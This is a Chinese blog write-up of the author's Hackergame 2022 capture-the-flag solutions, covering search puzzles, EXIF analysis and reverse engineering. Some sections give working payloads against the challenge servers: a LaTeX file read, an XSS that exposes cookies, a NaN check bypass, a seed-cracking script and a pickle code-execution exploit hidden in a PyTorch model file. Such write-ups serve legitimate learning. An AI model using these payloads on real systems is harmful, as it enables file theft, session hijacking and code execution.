---
comment: True
---

# Hackergame 2022 Writeup

!!! abstract
    第二次来打 Hackergame。这里是我做出的题的 writeup，博客版在：https://blog.tonycrane.cc/p/630bfdd5.html

    [官方 writeup](https://github.com/USTC-Hackergame/hackergame2021-writeups)

-----

## 签到
![](https://img.shields.io/badge/-WEB-blueviolet?style=flat-square)
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)


> 众所周知，签到题是一道手速题。
> 
> 为了充分发挥出诸位因为各种原因而手速优异于常人的选手们的特长，我们精心设计了今年的签到题。进一步地，为了更细致地区分不同手速的选手，我们还通过详尽的调研及统计分析，将签下字符的时间限制分为了多个等级。只有最顶尖的手速选手，才能在 CPU 来得及反应之前顺利签下 2022，从而得到光荣的 flag！

一个网站，手写数字成功识别为 2022 就可以完成签到。不过限制了每个数字的时间，依次为 2s、1s、0.1s、0s。

我还天真地试着签了好几次（其实是没注意到那个 0），~~痛失一血~~。

做法其实是在源码里发现识别都在前端进行，最终提交的时候是跳转到 `/?result=....` 页面（或者交一次试一下也能看出来）。所以直接访问 `/?result=2022` 即可拿到 flag：**flag{HappyHacking2022-……}**

-----

## 猫咪问答喵
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

> 参加猫咪问答喵，参加喵咪问答谢谢喵。

经典题目，搜索大杂烩。除了第五题以外还是很容易找到的。（这次竟然分了两个 flag 出来 2333）

<style>
.content blockquote ol {
    margin-top: 0;
}
</style>

> 1. 中国科学技术大学 NEBULA 战队（USTC NEBULA）是于何时成立的喵？

直接搜索了一下 “中国科技大学 NEBULA 战队”，找到了一篇新闻：[中国科学技术大学星云（Nebula）战队在第六届强网杯再创佳绩](http://cybersec.ustc.edu.cn/2022/0826/c23847a565848/page.htm)，其中文末有简单介绍 “中国科学技术大学星云战队（Nebula）成立于 *2017 年 3 月*……”

所以答案就是 **2017-03**。

> 2. 2022 年 9 月，中国科学技术大学学生 Linux 用户协会（LUG @ USTC）在科大校内承办了软件自由日活动。除了专注于自由撸猫的主会场之外，还有一些和技术相关的分会场（如闪电演讲 Lightning Talk）。其中在第一个闪电演讲主题里，主讲人于 slides 中展示了一张在 GNOME Wayland 下使用 Wayland 后端会出现显示问题的 KDE 程序截图，请问这个 KDE 程序的名字是什么？

在 LUG @ USTC 的 wiki 就能找到软件自由日活动的页面：[Software Freedom Day](https://lug.ustc.edu.cn/wiki/lug/events/sfd/)，其中可以找到所说的那篇 slides：[《GNOME Wayland 使用体验：一个普通用户的视角》](https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdf)，其中第十五页讲了所谓的 KDE 程序在 Wayland 下的显示问题。但截图里并没有软件名，把下面一行工具栏的文本全怼到必应里，搜到了 Kdenlive 的官方文档。

所以答案是 **Kdenlive**。

> 3. 22 年坚持，小 C 仍然使用着一台他从小用到大的 Windows 2000 计算机。那么，在不变更系统配置和程序代码的前提下，Firefox 浏览器能在 Windows 2000 下运行的最后一个大版本号是多少？

搜索 “Firefox Windows 2000” 可以看到 Firefox 13 不再支持 Windows 2000 的很多新闻。

所以答案是 **12**。

> 4. 你知道 PwnKit（CVE-2021-4034）喵？据可靠谣传，出题组的某位同学本来想出这样一道类似的题，但是发现 Linux 内核更新之后居然不再允许 argc 为 0 了喵！那么，请找出在 Linux 内核 master 分支（torvalds/linux.git）下，首个变动此行为的 commit 的 hash 吧喵！

在 Linux 内核 GitHub dev 页面全局搜索了一下 argc == 0，发现了一些检查。找到个比较像的进到页面里 blame，找到了 commit：[exec: Force single empty string when argv is empty](https://github.com/torvalds/linux/commit/dcd46d897adb70d63e025f175a00a89797d31a43)（其实 commit message 里就写了 CVE-2021-4034）。

所以答案是 **dcd46d897adb70d63e025f175a00a89797d31a43**。

> 5. 通过监视猫咪在键盘上看似乱踩的故意行为，不出所料发现其秘密连上了一个 ssh 服务器，终端显示 `ED25519 key fingerprint is MD5:e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce.`，你知道猫咪在连接什么域名吗？

比较难搞的一道题，想了很长时间，甚至以为是一些 crypto 题。不过毕竟是一道搜索题，于是直接把 md5 fingerprint 怼到谷歌里，搜到了一个文档其中有这个（可能是做个例子）：[Zeek Logs > ssh.log](https://docs.zeek.org/en/master/logs/ssh.html#outbound-movement)。看到里面对应的 ip：205.166.94.16，访问进去看到了 sdf.org 域名。

所以答案是 **sdf.org**。（其实是囤 flag 阶段才做出来的）

> 6. 中国科学技术大学可以出校访问国内国际网络从而允许云撸猫的“网络通”定价为 20 元一个月是从哪一天正式实行的？

搜了一下，发现了一篇通知：[关于实行新的网络费用分担办法的通知](https://www.ustc.edu.cn/info/1057/4931.htm)，是 2011 年 1 月 1 日施行的，但是这篇通知里国际网络通费用并没有改变，还是 20 元。看来是比较久远的事情了。搜索同名通知，可以发现[另一篇](http://ustcnet.ustc.edu.cn/2003/0301/c11109a210890/pagem.htm)。里面写了国际网络通定价 20 元，2003 年 3 月 1 日实行。

所以答案是 **2003-03-01**。

交上去得到两个 flag（一个是对三道题的，一个是对六道题的）：
**flag{meowexammeow_……}**
**flag{meowexamfullymeowed!_……}**

-----

## 家目录里的秘密
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

> 实验室给小 K 分配了一个高性能服务器的账户，为了不用重新配置 VSCode, Rclone 等小 K 常用的生产力工具，最简单的方法当然是把自己的家目录打包拷贝过去。
>
> 但是很不巧，对存放于小 K 电脑里的 Hackergame 2022 的 flag 觊觎已久的 Eve 同学恰好最近拿到了这个服务器的管理员权限（通过觊觎另一位同学的敏感信息），于是也拿到了小 K 同学家目录的压缩包。
>
> 然而更不巧的是，由于 Hackergame 部署了基于魔法的作弊行为预知系统，Eve 同学还未来得及解压压缩包就被 Z 同学提前抓获。
>
> 为了证明 Eve 同学不良企图的危害性，你能在这个压缩包里找到重要的 flag 信息吗？

给了一个用户家目录的压缩包，进去全局搜索一下 flag 可以发现 VSCode 的历史文件里有一个 DUGV.c 里有一个注释掉的 flag：**flag{finding_everything_through_vscode_config_file_……}**（抢了个一血 2333）

第二部分还是有些复杂的。搜 flag 的时候还可以发现 .config/rclone/rclone.conf 里有一个名为 flag2 的配置项：
```toml
[flag2]
type = ftp
host = ftp.example.com
user = user
pass = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ
```

没用过 rclone，自己装了一个试了一下，发现 pass 是混淆后的，而且是随机的，有一个命令 rclone obscure 可以用来混淆密码。文档里也说了混淆的目的也只是防止有人可以一眼看到密码而已，并没有加密，rclone 是可以直接复原明文的。于是就翻了下 rclone 源码，可以在 obscure [相关源码](https://github.com/rclone/rclone/blob/master/fs/config/obscure/obscure.go) 里找到恢复相关的函数 Reveal，复制下来跑一下给出的 pass 即可以恢复密码，即：**flag{get_rclone_password_from_config!_……}**

-----

## HeiLang
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

> 来自 Heicore 社区的新一代编程语言 HeiLang，基于第三代大蟒蛇语言，但是抛弃了原有的难以理解的 | 运算，升级为了更加先进的语法，用 A[x | y | z] = t 来表示之前复杂的 A[x] = t; A[y] = t; A[z] = t。
> 
> 作为一个编程爱好者，我觉得实在是太酷了，很符合我对未来编程语言的想象，科技并带着趣味。

题给了一个以这种语法写的生成数组的代码，以及验证结果的 python 代码。其实题目已经说的很明确了，不过懒得写，记得 GitHub 上看到过一个项目 [HeLang](https://github.com/kifuan/helang/)，不过里面的数组下标从 1 开始，所以就写了段代码来将 [] 中的数都加一，跑一遍输出数组 a，然后替代原来文件里的部分，跑一下就可以拿到 flag：**flag{6d9ad6e9a6268d96-97091f6fffb6935c}**

-----

## Xcaptcha
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)
![](https://img.shields.io/badge/-WEB-blueviolet?style=flat-square)

> ~~题目太长了，省略了部分背景故事~~
> 
> 众人目目相觑。
> 
> 「我来试试。」，一名队员上前点击了按钮。然后，屏幕显示「请在一秒内完成以下加法计算」。
> 
> 还没等反应过来，屏幕上的字又开始变幻，显示着「验证失败」。而你作为突击队中唯一的黑客，全村人民最后的希望，迎着纷纷投来的目光，能否在规定时间内完成验证，打开机房，不，推开和平时代的大门？

大概就是点击认证后在一秒内计算三个大整数加法然后提交。手快存一份 html，按照其中要求正则一下提取出算式然后做加法再 post 回去。

```python
import re, requests
url = "http://202.38.93.111:10047/xcaptcha"
s = requests.session()
s.get("http://202.38.93.111:10047/?token=……")
res = re.findall(r">(\d*?)\+(\d*?) ", s.get(url).text)
print(s.post(url, data={f'captcha{i+1}': str(int(res[i][0]) + int(res[i][1])) for i in range(3)}).text)
```

（~~经典压行~~）跑一下拿到 flag：**flag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_……}**

-----

## LaTeX 机器人
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)
![](https://img.shields.io/badge/-WEB-blueviolet?style=flat-square)

> 在网上社交群组中交流数学和物理问题时，总是免不了输入公式。而显然大多数常用的聊天软件并不能做到这一点。为了方便大家在水群和卖弱之余能够高效地进行学术交流，G 社的同学制作了一个简单易用的将 LaTeX 公式代码转换成图片的网站，并通过聊天机器人在群里实时将群友发送的公式转换成图片发出。
> 
> 这个网站的思路也很直接：把用户输入的 LaTeX 插入到一个写好头部和尾部的 TeX 文件中，将文件编译成 PDF，再将 PDF 裁剪成大小合适的图片。
>
> “LaTeX 又不是被编译执行的代码，这种东西不会有事的。”
> 
> 物理出身的开发者们明显不是太在意这个网站的安全问题，也没有对用户的输入做任何检查。
> 
> 那你能想办法获得服务器上放在根目录下的 flag 吗？
> 
> **纯文本**
> 
> 第一个 flag 位于 /flag1，flag 花括号内的内容由纯文本组成（即只包含大写小写字母和数字 0-9）。
> 
> **特殊字符混入**
> 
> 第二个 flag 位于 /flag2，这次，flag 花括号内的内容除了字母和数字之外，还混入了两种特殊字符：下划线（_）和井号（#）。你可能需要想些其他办法了。

第一个 flag 很简单，只需要 input 一下即可：`\input{/flag1}`，可以看到 flag：**flag{becAr3fu11dUd3……}**。

第二个 flag 因为里面包含特殊字符，所以在渲染的时候会出现错误。解决方案是利用 [LaTeX 的 active character 概念](https://www.latexstudio.net/archives/10883.html)来将 \_ 和 # 替换为 \\\_ 和 \\#，先将其字符的 catcode 设置为 \active，然后定义命令序列。payload 为：
```latex
$$\catcode`\_=\active \def_{\_} \catcode`\#=\active \def#{\#}\input{/flag2}$$
```
得到 flag：**flag{latex_bec_0_m##es_co__#ol_……}**

-----

## 链上记忆大师
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)
![](https://img.shields.io/badge/-BLOCKCHAIN-orange?style=flat-square)

> 听说你在区块链上部署的智能合约有过目不忘的能力。

第一道题题目合约：
```javascript
pragma solidity =0.8.17;

interface MemoryMaster {
    function memorize(uint256 n) external;
    function recall() external view returns (uint256);
}

contract Challenge {
    function test(MemoryMaster m, uint256 n) external returns (bool) {
        m.memorize(n);
        uint256 recalled = m.recall();
        return recalled == n;
    }
}
```

很简单，写一个合约存值，实现 memorize 和 recall 方法存取值即可：
```javascript
pragma solidity =0.8.17;

contract Exploit {
    uint256 num;
    function memorize(uint256 n) external {
        num = n;
    }
    function recall() external view returns(uint256) {
        return num;
    }
}
```

Remix 里编译然后上传即可，flag：**flag{Y0u_Ar3_n0w_f4M1l1ar_W1th_S0l1dity_st0rage_……}**

第一题抢了一血。第二三题看了属实蒙圈。第二题在调用 memorize 之后接了一个 revert 恢复状态变化。第三题限定 memorize 方法为 view 函数，即不能修改状态。感觉很神奇，可能是用了某些 EVM 特性吧。蹲 wp 学学。

-----

## 旅行照片 2.0
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

> 你的学长决定来一场蓄谋已久的旅行。通过他发给你的照片来看，酒店应该是又被他住下了。
> 
> ![](/assets/images/writeups/hackergame2022/travel-photo-2.jpeg)

### 照片分析

<style>
.content blockquote ol {
    margin-top: 0;
}
</style>

第一部分是五个关于图片 exif 信息的问题，直接使用 exiftool 读取即可：

> 1. 图片所包含的 EXIF 信息版本是多少？（如 2.1）。

exiftool 显示是 0231，但实际上是 **2.31**。

> 2. 拍照使用手机的品牌是什么？

exiftool 可以看到 `Make: Xiaomi`，所以答案是 **小米/红米**。

> 3. 该图片被拍摄时相机的感光度（ISO）是多少？（整数数字，如 3200）

`ISO: 84`，所以答案为 **84**。

> 4. 照片拍摄日期是哪一天？（格式为年/月/日，如 2022/10/01。按拍摄地点当地日期计算。）

`Create Date: 2022:05:14 18:23:35.220027+09:00`，所以答案为 **2022/05/14**。

> 5. 照片拍摄时是否使用了闪光灯？

`Flash: Off, Did not fire`（或者看反光也能看出来）所以答案为 **否**。

flag：**flag{1f_y0u_d0NT_w4nt_shOw_theSe_th3n_w1Pe_EXlF}**

### 社工实践
接下来第二部分是五个关于图片社工分析的问题。

> 1. 请写出拍照人所在地点的邮政编码，格式为 3 至 10 位数字，不含空格或下划线等特殊符号（如 230026、94720）。

通过放大图片可以看到楼下的体育馆外面写的有 “ZOZO” 样式，搜索可以找到这里是日本千叶海洋球场。通过 Google 地图找到拍照人所在地点：APA HOTEL& RESORT TOKYO BAY MAKUHARI 〒261-0021 Chiba, Mihama Ward, Hibino, 2 Chome-3，所以邮编为 **2610021**。（这里有个坑，日本邮编划分很细，球场和酒店的邮编不一样，所以要注意）

> 2. 照片窗户上反射出了拍照人的手机。那么这部手机的屏幕分辨率是多少呢？（格式为长 + 字母 x + 宽，如 1920x1080）

通过京东搜索小米手机，以及玻璃反光中的后置摄像头样式可以知道这部手机是红米 Note 9，屏幕分辨率为 **2340x1080**。

> 3. 仔细观察，可以发现照片空中（白色云上方中间位置）有一架飞机。你能调查出这架飞机的信息吗？，包括 起飞机场（IATA 机场编号，如 PEK）、降落机场（IATA 机场编号，如 HFE）、航班号（两个大写字母和若干个数字，如 CA1813）

做这道题的时候时间正好是下午五点二十多，对应日本时间下午六点二十多，也就是类似拍照的时间，在实时飞机航线地图中正好看见有一架飞机在该处上空，起飞机场是 HND。通过飞机方向可以确定起飞机场就是 **HND**。然后找到每天大概这个时间从 HND 出发向北的飞机，通过尝试得到降落机场为 **HIJ**，航班号为 **NH683**。（也可以爆破，这道题的验题逻辑是将表单结果进行 base64，然后 GET 结果.txt，正确则 200 且里面是 flag，错误则 404）

flag：**flag{Buzz_0ver_y0ur_h34d_and_4DSB_m19ht_111egal}**

-----

## 猜数字
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

> 这个小游戏需要做的事情非常简单：在 0 和 1 之间猜一个数字（精确到小数点后 6 位），并通过反馈的「大」还是「小」修正猜测，直至完全猜中。一次性命中的概率显然也是一百万分之一（和五边形的「嫩牛七方」达成了某种意义上的同构）——但从学霸室友手中借来的概率论与统计学笔记上万千公式的模样在思绪中一瞬而过，于是你默默祈祷着大数定理，虔诚地按下了提交的按钮。

题目给出了网页服务的 Java 源码。本来想着是爆破伪随机数，不过源码里用的是 SecureRandom，不能爆破。然后仔细看源码。发现了一些比较可疑的东西，明明比较的都是六位小数，是可以乘 1000000 然后判断整数相等的，但它偏要比较输入和两个小数的大小（是否不大于且不小于）。而如果输入是 NaN，则任何比较都是 False，也就让程序认为输入和预期相等了。

不过因为规定了小数，所以 NaN 在前端不能直接写入，需要手动 POST 到 `/state`，用一个任意数字试一下，可以在 DevTool 里捕获到 POST 数据格式。然后手动 POST 一个 <state\><guess\>NaN</guess\></state\> 再 GET 一下就能在返回数据中看到 flag：**flag{gu3ss-n0t-a-numb3r-1nst3ad-……}**

-----

## Flag 的痕迹
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)
![](https://img.shields.io/badge/-WEB-blueviolet?style=flat-square)

> 小 Z 听说 Dokuwiki 配置很简单，所以在自己的机器上整了一份。可是不巧的是，他一不小心把珍贵的 flag 粘贴到了 wiki 首页提交了！他赶紧改好，并且也把历史记录（revisions）功能关掉了。
> 
> 「这样就应该就不会泄漏 flag 了吧」，小 Z 如是安慰自己。
> 
> 然而事实真的如此吗？
> 
> >（题目 Dokuwiki 版本基于 2022-07-31a "Igor"）

一个 Dokuwiki 框架搭的网站，目标是找到首页的修改。版本是最新的，搜不到啥漏洞。自己部署了一下玩玩，看起来 revisions 等功能关掉之后确实没法看修改记录了。而且题目是 external edit，也就是直接修改了文件，而没有通过网页编辑。

然后就读了读源码，搜了下 issue 看到了一个 revision 相关的 https://github.com/splitbrain/dokuwiki/issues/3576，里面提到了 `?do=diff`，尝试访问 `/doku.php?id=start&do=diff`，确实能看到修改记录，其中 flag：**flag{d1gandFInD_d0kuw1k1_unexpectEd_API}**

-----

## 安全的在线测评
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

> 传说科大新的在线测评系统（Online Judge）正在锐意开发中。然而，新 OJ 迟迟不见踪影，旧的 OJ 和更旧的 OJ 却都已经停止了维护。某 2022 级计算机系的新生小 L 等得不耐烦了，当即表示不就是 OJ 吗，他 10 分钟就能写出来一个。
> 
> **无法 AC 的题目**
> 
> 为了验证他写的新 OJ 的安全性，他决定在 OJ 上出一道不可能完成的题目——大整数分解，并且放出豪言：只要有人能 AC 这道题，就能得到传说中的 flag。当然，因为目前 OJ 只能运行 C 语言代码，即使请来一位少年班学院的天才恐怕也无济于事。
> 
> **动态数据**
> 
> 为了防止数据意外泄露，小 L 还给 OJ 加入了动态数据生成功能，每次测评会随机生成一部分测试数据。这样，即使 OJ 测试数据泄露，攻击者也没办法通过所有测试样例了吧！（也许吧？）

第一题就是使用 ./data/static.in 和 ./data/static.out 作为输入输出。而且也没有设置权限，所以直接读取 ./data/static.out 内容并输出即可。flag：**flag{the_compiler_is_my_eyes_b18ad6f041}**

第二题动态生成数据，而且设置了权限，用户不能读取，不知道该怎么做。

-----

## 线路板
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

> 中午起床，看到室友的桌子上又多了一个正方形的盒子。快递标签上一如既往的写着：线路板。和往常一样，你“帮”室友拆开快递并抢先把板子把玩一番。可是突然，你注意到板子表面似乎写着些东西……看起来像是……flag？
> 
> 可是只有开头的几个字母可以看清楚。你一时间不知所措。
> 
> 幸运的是，你通过盒子上的联系方式找到了制作厂家，通过板子丝印上的序列号查出了室友的底细，并以放弃每月两次免费 PCB 打样包邮的机会为代价要来了这批带有 flag 的板子的生产文件。那这些文件里会不会包含着更多有关 flag 的信息呢？

给了一些 gbr 文件，搜了一下用 Gerbv 打开。发现 flag 相关内容在 F_Cu 这部分上，有一些圆环遮挡了，点击去掉就可以看见 flag：**flag{8_1ayER_rogeRS_81ind_V1a}**

![](/assets/images/writeups/hackergame2022/gerbv.png)

-----

## Flag 自动机
![](https://img.shields.io/badge/-REVERSE-inactive?style=flat-square)

> Hackergame 2022 组委会为大家搬来了一台能够自动获取 flag 的机器。然而，想要提取出其中的 flag 似乎没那么简单……

一个使用 Win32 API 的窗口程序的逆向。夺取 flag 的按钮点不上。逆向一下，在 WinMain 函数里看到注册了一个事件处理函数在 0x401510 处。枚举了 msg 的值，也就是事件：

- 1：即创建窗口，创建了三个按钮，一个是 “狠心夺取”，对应的 hMENU 为 3，一个 “放手离开”，hMENU 为 2，一个没有显示不管
- 0x111：即点击，此时的参数 wParam（即 a3）为点击的按钮的 hMENU，当 a3 为 2 时退出，a3 为 3 时检查 lParam 是否为 114514，如果是则输出 flag 到文件中

因此可以直接在汇编里 patch 一下程序，将判断 a3 为 2 或 3 调换一下，然后再将判断 lParam 的 jz 变成 jnz。之后 Apply、运行点击放手离开即可输出 flag：**flag{Y0u_rea1ly_kn0w_Win32API_……}**

-----

## 杯窗鹅影
![](https://img.shields.io/badge/-BIN-inactive?style=flat-square)

> 说到上回，小 K 在获得了实验室高性能服务器的访问权限之后就迁移了数据（他直到现在都还不知道自己的家目录备份被 Eve 下载了）。之后，为了跑一些别人写的在 Windows 下的计算程序，他安装了 wine 来运行它们。
> 
> 「你用 wine 跑 Windows 程序，要是中毒了咋办？」
> 
> 「没关系，大不了把 wineprefix 删了就行。我设置过了磁盘映射，Windows 程序是读不到我的文件的！」
> 
> 但果真如此吗？
> 
> 为了验证这一点，你需要点击「打开/下载题目」按钮，上传你的程序实现以下的目的：
> 
> 1. /flag1 放置了第一个 flag。你能给出一个能在 wine 下运行的 x86_64 架构的 Windows 命令行程序来读取到第一个 flag 吗？
> 2. /flag2 放置了第二个 flag，但是需要使用 /readflag 程序才能看到 /flag2 的内容。你能给出一个能在 wine 下运行的 x86_64 架构的 Windows 命令行程序来执行 /readflag 程序来读取到第二个 flag 吗？

第一个 flag 也很简单，直接读取 /flag1 输出就可以了。

第二个 flag 搞的时候试过 system、execl 啥的，一些命令都没办法执行，不知道该怎么办，不想研究了，开摆

-----

## 微积分计算小练习
![](https://img.shields.io/badge/-WEB-blueviolet?style=flat-square)

> 小 X 作为某门符号计算课程的助教，为了让大家熟悉软件的使用，他写了一个小网站：上面放着五道简单的题目，只要输入姓名和题目答案，提交后就可以看到自己的分数。
> 
> 点击此链接访问练习网站（没链接）
> 
> 想起自己前几天在公众号上学过的 Java 设计模式免费试听课，本着前后端离心（咦？是前后端离心吗？还是离婚？离。。离谱？总之把功能能拆则拆就对啦）的思想，小 X 还单独写了一个程序，欢迎同学们把自己的成绩链接提交上来。
> 
> 总之，因为其先进的设计思想，需要同学们做完练习之后手动把成绩连接贴到这里来：
> 
> 点击此链接提交练习成绩 URL（没链接）

点进第一个链接，随便做一遍，得到成绩分享页面 `/share?result=...`，然后将链接贴到第二个链接里，会自动读取出名字和成绩。

读取的过程是用 selenium 打开一个浏览器，GET login 然后将 flag 放入 cookie，在 GET 输入的 url（会替换掉 netloc 为 web，scheme 为 http），然后读取 #greeting 和 #score 的内容。

再看第一个链接，其 result 是可以构造的，相关逻辑：
```javascript
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const result = urlParams.get('result');
const b64decode = atob(result);
const colon = b64decode.indexOf(":");
const score = b64decode.substring(0, colon);
const username = b64decode.substring(colon + 1);

document.querySelector("#greeting").innerHTML = "您好，" + username + "！";
document.querySelector("#score").innerHTML = "您在练习中获得的分数为 <b>" + score + "</b>/100。";
```
也就是将 result base64 解码，: 前面的为分数，后面的为用户名，然后填写进去。这里就可以进行 xss。没学过 xss，所以想了半天插入一个 script tag 之后怎么让处在前面的它被运行，后来搜了搜才知道可以利用 onload onerror 这些事件来填写脚本。

所以 payload 就是 `100:<img src=1 onerror="document.querySelector('#greeting').innerHTML=document.cookie">`，然后 base64 后作为 result 传入，再丢给第二个提交链接，得到 flag：**flag{xS5_1OI_is_N0t_SOHARD_3c97784c1a}**

-----

## 蒙特卡罗轮盘赌
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

> 这个估算圆周率的经典算法你一定听说过：往一个 1x1 大小的方格里随机撒 N 个点，统计落在以方格某个顶点为圆心、1 为半径的 1/4 扇形区域中撒落的点数为 M，那么 M/N 就将接近于 π/4 。
> 
> 当然，这是一个概率性算法，如果想得到更精确的值，就需要撒更多的点。由于撒点是随机的，自然也无法预测某次撒点实验得到的结果到底是多少——但真的是这样吗？
> 
> 有位好事之徒决定借此和你来一场轮盘赌：撒 40 万个点计算圆周率，而你需要猜测实验的结果精确到小数点后五位。为了防止运气太好碰巧猜中，你们约定五局三胜。

看起来没什么其它漏洞，从伪随机入手，设置的随机种子为 time(0)+clock()，也就是当前时间戳加上程序运行到此处的 ticks 数。时间戳以秒为单位，波动不大，直接使用连接时的时间戳就可以。clock() 会有较大波动，从 0 开始枚举，将得到的值传入一个 C 程序中作为随机种子，模拟一下，看一看前两个是否能和正确结果对上。能对上则说明随机种子找对了，将后三个结果输回去即可完成。

```python
import time
import subprocess
from tqdm import tqdm
from pwn import *

# p = process('./challenge')
p = remote("202.38.93.111", 10091)
token = "..."
p.sendlineafter(b": ", token.encode())
timestamp = int(time.time())

def crack_seed(res1, res2):
    for clock in tqdm(range(0, 9000)):
        seed = timestamp + clock
        cracker = subprocess.run(
            ["./exp", str(seed)],
            stdout=subprocess.PIPE,
        )
        res = cracker.stdout.decode().strip().split('\n')
        if res[0] == str(res1) and res[1] == str(res2):
            print(seed)
            return res
        seed = timestamp - clock
        cracker = subprocess.run(
            ["./exp", str(seed)],
            stdout=subprocess.PIPE,
        )
        res = cracker.stdout.decode().strip().split('\n')
        if res[0] == str(res1) and res[1] == str(res2):
            print(seed)
            return res
    exit(1)

p.recvuntil("：".encode("utf-8"))
p.sendline(b'3.14159')
win = p.recvline().decode().strip()
if win == "猜对了！":
    res1 = "3.14159"
else:
    p.recvuntil("：".encode("utf-8"))
    res1 = p.recvline().decode().strip()

p.recvuntil("：".encode("utf-8"))
p.sendline(b'3.14159')
win = p.recvline().decode().strip()
if win == "猜对了！":
    res2 = "3.14159"
else:
    p.recvuntil("：".encode("utf-8"))
    res2 = p.recvline().decode().strip()

print(res2)
res = crack_seed(res1, res2)

p.recvuntil("：".encode("utf-8"))
p.sendline(res[2].encode("utf-8"))
p.recvuntil("：".encode("utf-8"))
p.sendline(res[3].encode("utf-8"))
p.recvuntil("：".encode("utf-8"))
p.sendline(res[4].encode("utf-8"))
p.interactive()
```

运行得到 flag：**flag{raNd0m_nUmb34_a1wayS_m4tters_……}**

哦对了，有一个很坑的点是 mac 上的 gcc 其实是 clang 的 alias，而 clang 和 gcc 的随机数有区别，在 mac 上跑的话就一直爆不出来种子。在 Linux 上就可以一下爆出来。

-----

## 二次元神经网络
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)
![](https://img.shields.io/badge/-WEB-blueviolet?style=flat-square)

> 天冷极了，下着雪，又快黑了。这是一年的最后一天——大年夜。在这又冷又黑的晚上，一个没有 GPU、没有 TPU 的小女孩，在街上缓缓地走着。她从家里出来的时候还带着捡垃圾捡来的 E3 处理器，但是有什么用呢？跑不动 Stable Diffusion，也跑不动 NovelAI。她也想用自己的处理器训练一个神经网络，生成一些二次元的图片。
> 
> 于是她配置好了 PyTorch 1.9.1，定义了一个极其简单的模型，用自己收集的 10 张二次元图片和对应的标签开始了训练。
> 
> 她在 CPU 上开始了第一个 epoch 的训练，loss 一直在下降，许多二次元图片重叠在一起，在向她眨眼睛。
> 
> 她又开始了第二个 epoch，loss 越来越低，图片越来越精美，她的眼睛也越来越累，她的眼睛开始闭上了。
> 
> ...
> 
> 第二天清晨，这个小女孩坐在墙角里，两腮通红，嘴上带着微笑。新年的太阳升起来了，照在她小小的尸体上。
> 
> 人们发现她时才知道，她的模型在 10 张图片上过拟合了，几乎没有误差。
> 
> （完）
> 
> 听完这个故事，你一脸的不相信：「这么简单的模型怎么可能没有误差呢？」，于是你开始复现这个二次元神经网络。

目标看起来就是让模型生成的图片和预期几乎没有误差。试着多训练几轮，试图过拟合，记录一下 loss，发现降到 0.001+ 的时候就降不下去了，而需要的是 0.0005
![](/assets/images/writeups/hackergame2022/loss.png)

看起来不可行。而且这是一道 web 类题，考虑用一些手段来让它认为我的输出是完全正确的。

搜索可以发现存的 .pt 文件中有使用 pickle 序列化存储的 .pkl 文件。而在读取的时候也会进行反序列化，这也就存在一个 pickle 反序列化的漏洞。

我们可以自己写一个恶意类然后打包到 data.pkl 压缩进 .pt 文件，在反序列化的时候就会执行其中的代码，比如：
```python
class Exploit(object):
    def __reduce__(self):
        return (os.system, ("...", ))
```
这个在本地测试的时候运行 infer.py 可以打通，但远程就不可以。所以可以猜测远程实际上从其它模块中调用了 infer 函数，如果没有正常返回，则会报错。

那么我们的思路就是让整个程序都可以正常运行，只是在反序列化的时候进行一些操作。根据源码可以知道最终会将模型输出的结果存放在 /tmp/result.json 中，然后在其它位置再读取这个文件，进行判断。而如果没有这个文件则会直接报错。

所以可以在 reduce 中将完全正确的结果先写入 /tmp/result.json 中。但如果这时直接 exit，则后面程序无法执行，会出现报错。所以还需要让后面完全正常运行。整个 infer 函数的逻辑大概如下：
```python
def infer(pt_file):
    # ...
    model = SimpleGenerativeModel(n_tags=n_tags, dim=dim, img_shape=img_shape)
    model.load_state_dict(torch.load(pt_file, map_location="cpu"))
    
    # ... predict

    json.dump({"gen_imgs_b64": gen_imgs}, open("/tmp/result.json", "w"))
```
我们输入的 pt 文件会在 torch.load 中进行反序列化，这时会写入 /tmp/result.json。而后面对于我们写入的威胁就是还会 json.dump 一次。所以首先需要将 json.dump 这个函数的作用抹除掉：`__import__('json').dump=lambda x, y: 0`。但这还不够，因为参数中的 open 也会执行，以 w 方式打开文件的话会先直接清空文件，所以也需要抹掉 open 的作用。不过后面肯定还会需要使用 open 来读取文件，所以只能抹掉写入的部分：`__builtins__['_open'] = open; __builtins__['open']=lambda x, y: 0 if y=='w' else __builtins__['_open'](x, y)`。

这样来讲我们的 exp 就是：
```python
class Exploit(object):
    def __reduce__(self):
        text = '{"gen_imgs_b64": ["......'
        return (exec, (f"open('/tmp/result.json', 'w').write('{text}');"
            "__import__('json').dump=lambda x, y: 0;"
            "__builtins__['_open']=open;"
            "__builtins__['open']=lambda x, y: 0 if y=='w' else __builtins__['_open'](x, y)", ))
```

但仅将这个打包后得到的 data.pkl 直接压缩进 pt 文件还是不行。因为模型就没法正常读取了，所以还需要对其进行一些修改。

pkl 文件实际存储的是一个构造好的虚拟机指令，pickle 反序列化时会执行它。看源码可以了解到有一个指令 0x2E 表示了结束返回。所以直接将生成的 data.pkl 末尾的 0x2E 去掉，然后直接接上一份正确的 data.pkl 内容即可完成构造。

构造好后上传 pt 文件，即可达到目标得到 flag：**flag{Torch.Load.Is.Dangerous-……}**

-----

## 光与影
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

> 冒险，就要不断向前！
> 
> 在寂静的神秘星球上，继续前进，探寻 flag 的奥秘吧！

